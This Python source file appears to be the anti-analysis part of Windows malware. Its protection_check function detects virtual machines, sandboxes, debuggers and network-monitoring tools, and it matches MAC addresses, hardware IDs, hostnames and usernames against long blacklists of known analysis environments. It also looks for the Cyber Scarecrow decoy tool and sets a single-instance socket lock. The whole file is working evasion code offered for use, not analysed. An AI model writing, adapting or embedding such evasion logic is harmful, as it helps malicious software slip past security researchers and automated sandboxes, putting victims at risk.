import os
import getmac
import psutil
import subprocess
import socket
import requests
import time
import numpy as np
import pyautogui
import ctypes
import hashlib

def protection_check():
    try:
        requests.get("https://google.com") # the method may change in the future
    except requests.ConnectionError:
        return True
    
    scarecrow_hash = "83ea1c039f031aa2b05a082c63df12398e6db1322219c53ac4447c637c940dae"
    def check_scarecrow():
        scarecrow_paths = [
            "C:\\ProgramData\\ScareCrow",
            "C:\\Users\\Public\\ScareCrow",
            "C:\\Program Files\\Cyber Scarecrow"
        ]
        scarecrow_files = [
            "scarecrow.exe",
            "scarecrow.dll",
            "scarecrow.json",
            "scarecrow_payload.bin",
            "scarecrow_tray.exe",
            "scarecrow_core.exe",
            "scarecrow_process.exe"
        ]

        for path in scarecrow_paths:
            if os.path.exists(path):
                return True

        for root, dirs, files in os.walk("C:\\"):
            for file in files:
                if file.lower() in scarecrow_files:
                    return True

        reg_keys = [
            r"HKLM\SOFTWARE\ScareCrow",
            r"HKCU\SOFTWARE\ScareCrow",
            r"HKLM\SOFTWARE\Scarecrow"
        ]
        reg_keys_exist = False
        for key in reg_keys:
            try:
                subprocess.check_output(f'reg query {key}', creationflags=subprocess.CREATE_NO_WINDOW, shell=True)
                reg_keys_exist = True
                break
            except subprocess.CalledProcessError:
                continue
        
        if reg_keys_exist:
            return True
        else:
            return False

    def detect_cursor_sync(threshold=5):
        movements = []

        start_time = time.time()
        while time.time() - start_time < 5:
            x, y = pyautogui.position()
            movements.append((x, y))
            time.sleep(0.01)

        movements = np.array(movements)

        diffs = np.diff(movements, axis=0)
        diffs_magnitude = np.linalg.norm(diffs, axis=1)

        if np.any(diffs_magnitude < threshold):
            return True
        else: 
            return False

    def rdtsc():
        class LARGE_INTEGER(ctypes.Structure):
            _fields_ = [("LowPart", ctypes.c_uint32),
                        ("HighPart", ctypes.c_uint32)]

        class RDTSC(ctypes.Union):
            _fields_ = [("u", LARGE_INTEGER),
                        ("QuadPart", ctypes.c_uint64)]

        rdtsc_value = RDTSC()
        ctypes.windll.kernel32.QueryPerformanceCounter(ctypes.byref(rdtsc_value))
        return rdtsc_value.QuadPart

    def collect_rdtsc_data(duration=10):
        timings = []
        start_time = time.time()
        while time.time() - start_time < duration:
            start = rdtsc()
            time.sleep(0.1)
            end = rdtsc()
            timings.append(end - start)
        return timings

    def analyze_rdtsc_data(timings):
        mean_timing = np.mean(timings)
        stddev_timing = np.std(timings)
        return mean_timing, stddev_timing

    def detect_rdtsc_spoofing():
        timings = collect_rdtsc_data()
        mean_timing, stddev_timing = analyze_rdtsc_data(timings)
        threshold = 1200000
        if mean_timing < threshold or stddev_timing > (threshold * 0.1):
            return True
        return False

    def detect_hypervisors():
        hypervisor_files = [
            "C:\\windows\\system32\\drivers\\VBoxGuest.sys",
            "C:\\windows\\system32\\drivers\\VBoxSF.sys",
            "C:\\windows\\system32\\drivers\\VBoxVideo.sys",
            "C:\\windows\\system32\\drivers\\vm3dmp.sys",
            "C:\\windows\\system32\\drivers\\vmhgfs.sys",
            "C:\\windows\\system32\\drivers\\vmusbmouse.sys"
        ]
        for file in hypervisor_files:
            if os.path.exists(file):
                return True
        return False

    def is_vm():
        vm_files = [
            "C:\\windows\\system32\\vmGuestLib.dll",
            "C:\\windows\\system32\\vm3dgl.dll",
            "C:\\windows\\system32\\vboxhook.dll",
            "C:\\windows\\system32\\vboxmrxnp.dll",
            "C:\\windows\\system32\\vmsrvc.dll",
            "C:\\windows\\system32\\drivers\\vmsrvc.sys"
        ]
        vm_processes = [
            'vmtoolsd.exe', 
            'vmwaretray.exe', 
            'vmwareuser.exe',
            'vboxservice.exe', 
            'vboxtray.exe', 
            'vmwaretray.exe', 
            'prl_cc.exe', 
            'prl_tools.exe', 
            'xenservice.exe', 
            'qemu-ga.exe', 
            'joeboxserver.exe'
        ]

        try:
            bioscheck = subprocess.check_output("wmic bios get smbiosbiosversion", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
            if "Hyper-V" in str(bioscheck): 
                return True
        except: pass

        for file_path in vm_files:
            if os.path.exists(file_path):
                return True

        for process in psutil.process_iter(['pid', 'name']):
            if process.info['name'].lower() in vm_processes:
                with open(process.exe(), "rb") as file:
                    hash_ = hashlib.sha256(file.read()).hexdigest()

                    if hash_ == scarecrow_hash:
                        return False
                return True

        if detect_cursor_sync():
            return True
        if detect_rdtsc_spoofing():
            return True
        if detect_hypervisors():
            return True

        return False
    
    blacklisted_processes = [
        'fakenet.exe', 
        'dumpcap.exe', 
        'httpdebuggerui.exe', 
        'wireshark.exe', 
        'fiddler.exe', 
        'ida64.exe', 
        'ollydbg.exe', 
        'pestudio.exe', 
        'x96dbg.exe', 
        'x32dbg.exe', 
        'ksdumperclient.exe', 
        'ksdumper.exe'
    ]
    blacklisted_hwids = [
        "7AB5C494-39F5-4941-9163-47F54D6D5016",
        "03DE0294-0480-05DE-1A06-350700080009",
        "11111111-2222-3333-4444-555555555555",
        "6F3CA5EC-BEC9-4A4D-8274-11168F640058",
        "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548",
        "4C4C4544-0050-3710-8058-CAC04F59344A",
        "00000000-0000-0000-0000-AC1F6BD04972",
        "00000000-0000-0000-0000-000000000000",
        "5BD24D56-789F-8468-7CDC-CAA7222CC121",
        "49434D53-0200-9065-2500-65902500E439",
        "49434D53-0200-9036-2500-36902500F022",
        "777D84B3-88D1-451C-93E4-D235177420A7",
        "49434D53-0200-9036-2500-369025000C65",
        "B1112042-52E8-E25B-3655-6A4F54155DBF",
        "00000000-0000-0000-0000-AC1F6BD048FE",
        "EB16924B-FB6D-4FA1-8666-17B91F62FB37",
        "A15A930C-8251-9645-AF63-E45AD728C20C",
        "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3",
        "C7D23342-A5D4-68A1-59AC-CF40F735B363",
        "63203342-0EB0-AA1A-4DF5-3FB37DBB0670",
        "44B94D56-65AB-DC02-86A0-98143A7423BF",
        "6608003F-ECE4-494E-B07E-1C4615D1D93C",
        "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A",
        "49434D53-0200-9036-2500-369025003AF0",
        "8B4E8278-525C-7343-B825-280AEBCD3BCB",
        "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27",
        "79AF5279-16CF-4094-9758-F88A616D81B4",
        "FF577B79-782E-0A4D-8568-B35A9B7EB76B",
        "08C1E400-3C56-11EA-8000-3CECEF43FEDE",
        "6ECEAF72-3548-476C-BD8D-73134A9182C8",
        "49434D53-0200-9036-2500-369025003865",
        "119602E8-92F9-BD4B-8979-DA682276D385",
        "12204D56-28C0-AB03-51B7-44A8B7525250",
        "63FA3342-31C7-4E8E-8089-DAFF6CE5E967",
        "365B4000-3B25-11EA-8000-3CECEF44010C",
        "D8C30328-1B06-4611-8E3C-E433F4F9794E",
        "00000000-0000-0000-0000-50E5493391EF",
        "00000000-0000-0000-0000-AC1F6BD04D98",
        "4CB82042-BA8F-1748-C941-363C391CA7F3",
        "B6464A2B-92C7-4B95-A2D0-E5410081B812",
        "BB233342-2E01-718F-D4A1-E7F69D026428",
        "9921DE3A-5C1A-DF11-9078-563412000026",
        "CC5B3F62-2A04-4D2E-A46C-AA41B7050712",
        "00000000-0000-0000-0000-AC1F6BD04986",
        "C249957A-AA08-4B21-933F-9271BEC63C85",
        "BE784D56-81F5-2C8D-9D4B-5AB56F05D86E",
        "ACA69200-3C4C-11EA-8000-3CECEF4401AA",
        "3F284CA4-8BDF-489B-A273-41B44D668F6D",
        "BB64E044-87BA-C847-BC0A-C797D1A16A50",
        "2E6FB594-9D55-4424-8E74-CE25A25E36B0",
        "42A82042-3F13-512F-5E3D-6BF4FFFD8518",
        "38AB3342-66B0-7175-0B23-F390B3728B78",
        "48941AE9-D52F-11DF-BBDA-503734826431",
        "A7721742-BE24-8A1C-B859-D7F8251A83D3",
        "3F3C58D1-B4F2-4019-B2A2-2A500E96AF2E",
        "D2DC3342-396C-6737-A8F6-0C6673C1DE08",
        "EADD1742-4807-00A0-F92E-CCD933E9D8C1",
        "AF1B2042-4B90-0000-A4E4-632A1C8C7EB1",
        "FE455D1A-BE27-4BA4-96C8-967A6D3A9661",
        "921E2042-70D3-F9F1-8CBD-B398A21F89C6",
        "6AA13342-49AB-DC46-4F28-D7BDDCE6BE32",
        "F68B2042-E3A7-2ADA-ADBC-A6274307A317",
        "07AF2042-392C-229F-8491-455123CC85FB",
        "4EDF3342-E7A2-5776-4AE5-57531F471D56",
        "032E02B4-0499-05C3-0806-3C0700080009",
        "11111111-2222-3333-4444-555555555555"
    ]
    blacklisted_macs = [
        "05:17:5D:75:D5:54",
        "00:03:47:63:8b:de",
        "00:0c:29:05:d8:6e",
        "00:0c:29:2c:c1:21",
        "00:0c:29:52:52:50",
        "00:0d:3a:d2:4f:1f",
        "00:15:5d:00:00:1d",
        "00:15:5d:00:00:a4",
        "00:15:5d:00:00:b3",
        "00:15:5d:00:00:c3",
        "00:15:5d:00:00:f3",
        "00:15:5d:00:01:81",
        "00:15:5d:00:02:26",
        "00:15:5d:00:05:8d",
        "00:15:5d:00:05:d5",
        "00:15:5d:00:06:43",
        "00:15:5d:00:07:34",
        "00:15:5d:00:1a:b9",
        "00:15:5d:00:1c:9a",
        "00:15:5d:13:66:ca",
        "00:15:5d:13:6d:0c",
        "00:15:5d:1e:01:c8",
        "00:15:5d:23:4c:a3",
        "00:15:5d:23:4c:ad",
        "00:15:5d:b6:e0:cc",
        "00:1b:21:13:15:20",
        "00:1b:21:13:21:26",
        "00:1b:21:13:26:44",
        "00:1b:21:13:32:20",
        "00:1b:21:13:32:51",
        "00:1b:21:13:33:55",
        "00:23:cd:ff:94:f0",
        "00:25:90:36:65:0c",
        "00:25:90:36:65:38",
        "00:25:90:36:f0:3b",
        "00:25:90:65:39:e4",
        "00:50:56:97:a1:f8",
        "00:50:56:97:ec:f2",
        "00:50:56:97:f6:c8",
        "00:50:56:a0:06:8d",
        "00:50:56:a0:38:06",
        "00:50:56:a0:39:18",
        "00:50:56:a0:45:03",
        "00:50:56:a0:59:10",
        "00:50:56:a0:61:aa",
        "00:50:56:a0:6d:86",
        "00:50:56:a0:84:88",
        "00:50:56:a0:af:75",
        "00:50:56:a0:cd:a8",
        "00:50:56:a0:d0:fa",
        "00:50:56:a0:d7:38",
        "00:50:56:a0:dd:00",
        "00:50:56:ae:5d:ea",
        "00:50:56:ae:6f:54",
        "00:50:56:ae:b2:b0",
        "00:50:56:ae:e5:d5",
        "00:50:56:b3:05:b4",
        "00:50:56:b3:09:9e",
        "00:50:56:b3:14:59",
        "00:50:56:b3:21:29",
        "00:50:56:b3:38:68",
        "00:50:56:b3:38:88",
        "00:50:56:b3:3b:a6",
        "00:50:56:b3:42:33",
        "00:50:56:b3:4c:bf",
        "00:50:56:b3:50:de",
        "00:50:56:b3:91:c8",
        "00:50:56:b3:94:cb",
        "00:50:56:b3:9e:9e",
        "00:50:56:b3:a9:36",
        "00:50:56:b3:d0:a7",
        "00:50:56:b3:dd:03",
        "00:50:56:b3:ea:ee",
        "00:50:56:b3:ee:e1",
        "00:50:56:b3:f6:57",
        "00:50:56:b3:fa:23",
        "00:e0:4c:42:c7:cb",
        "00:e0:4c:44:76:54",
        "00:e0:4c:46:cf:01",
        "00:e0:4c:4b:4a:40",
        "00:e0:4c:56:42:97",
        "00:e0:4c:7b:7b:86",
        "00:e0:4c:94:1f:20",
        "00:e0:4c:b3:5a:2a",
        "00:e0:4c:b8:7a:58",
        "00:e0:4c:cb:62:08",
        "00:e0:4c:d6:86:77",
        "06:75:91:59:3e:02",
        "08:00:27:3a:28:73",
        "08:00:27:45:13:10",
        "12:1b:9e:3c:a6:2c",
        "12:8a:5c:2a:65:d1",
        "12:f8:87:ab:13:ec",
        "16:ef:22:04:af:76",
        "1a:6c:62:60:3b:f4",
        "1c:99:57:1c:ad:e4",
        "1e:6c:34:93:68:64",
        "2e:62:e8:47:14:49",
        "2e:b8:24:4d:f7:de",
        "32:11:4d:d0:4a:9e",
        "3c:ec:ef:43:fe:de",
        "3c:ec:ef:44:00:d0",
        "3c:ec:ef:44:01:0c",
        "3c:ec:ef:44:01:aa",
        "3e:1c:a1:40:b7:5f",
        "3e:53:81:b7:01:13",
        "3e:c1:fd:f1:bf:71",
        "42:01:0a:8a:00:22",
        "42:01:0a:8a:00:33",
        "42:01:0a:8e:00:22",
        "42:01:0a:96:00:22",
        "42:01:0a:96:00:33",
        "42:85:07:f4:83:d0",
        "4e:79:c0:d9:af:c3",
        "4e:81:81:8e:22:4e",
        "52:54:00:3b:78:24",
        "52:54:00:8b:a6:08",
        "52:54:00:a0:41:92",
        "52:54:00:ab:de:59",
        "52:54:00:b3:e4:71",
        "56:b0:6f:ca:0a:e7",
        "56:e8:92:2e:76:0d",
        "5a:e2:a6:a4:44:db",
        "5e:86:e4:3d:0d:f6",
        "60:02:92:3d:f1:69",
        "60:02:92:66:10:79",
        "7e:05:a3:62:9c:4d",
        "90:48:9a:9d:d5:24",
        "92:4c:a8:23:fc:2e",
        "94:de:80:de:1a:35",
        "96:2b:e9:43:96:76",
        "a6:24:aa:ae:e6:12",
        "ac:1f:6b:d0:48:fe",
        "ac:1f:6b:d0:49:86",
        "ac:1f:6b:d0:4d:98",
        "ac:1f:6b:d0:4d:e4",
        "b4:2e:99:c3:08:3c",
        "b4:a9:5a:b1:c6:fd",
        "b6:ed:9d:27:f4:fa",
        "be:00:e5:c5:0c:e5",
        "c2:ee:af:fd:29:21",
        "c8:9f:1d:b6:58:e4",
        "ca:4d:4b:ca:18:cc",
        "d4:81:d7:87:05:ab",
        "d4:81:d7:ed:25:54",
        "d6:03:e4:ab:77:8e",
        "ea:02:75:3c:90:9f",
        "ea:f6:f1:a2:33:76",
        "f6:a5:41:31:b2:78",
        ]
    blacklisted_hostnames = [
        "AppOnFly-VPS",
        "vboxuser",
        "ARCHIBALDPC",
        "6C4E733F-C2D9-4"
    ]
    blacklisted_usernames = [
        "WDAGUtilityAccount",
        "vboxuser"
    ]

    try:
        my_mac = str(getmac.get_mac_address())
        if my_mac in blacklisted_macs:
            return True
    except: pass

    try:
        my_hwid = subprocess.check_output("powershell (Get-CimInstance Win32_ComputerSystemProduct).UUID", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
        if my_hwid in blacklisted_hwids:
            return True
    except: pass

    try:
        hostname = socket.gethostname()
        if hostname in blacklisted_hostnames:
            return True
    except: pass

    try:
        username = os.getlogin()
        if username in blacklisted_usernames:
            return True
    except: pass

    try: 
        speedcheck = subprocess.check_output('wmic MemoryChip get /format:list | find /i "Speed"', creationflags=subprocess.CREATE_NO_WINDOW, shell=True).decode().strip()
        if "Speed=0" in str(speedcheck):
            return True
    except: pass

    for process in psutil.process_iter(['pid', 'name']):
        if process.info['name'].lower() in blacklisted_processes:
            with open(process.exe(), "rb") as file:
                hash_ = hashlib.sha256(file.read()).hexdigest()

                if hash_ == scarecrow_hash:
                    return False
            return True

    if check_scarecrow():
        return False

    if is_vm():
        return True

    return False

web_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
def single_instance_lock():
    try:
        web_socket.bind(('localhost', 12344))
    except socket.error: # on error socket is occupied -> another instance is running
        return True

    return False
